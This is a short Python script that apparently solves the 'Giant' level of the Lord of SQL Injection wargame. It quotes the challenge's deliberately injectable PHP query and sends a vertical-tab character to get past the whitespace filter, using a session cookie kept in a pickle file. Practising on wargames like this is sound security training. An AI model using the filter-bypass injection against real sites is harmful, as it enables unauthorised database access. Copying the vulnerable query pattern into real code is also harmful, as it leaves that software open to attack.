#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Giant

    if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
    if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
    $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result[1234]) solve("giant"); 
    '''

    url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = dict(shit="\v")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Giant Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
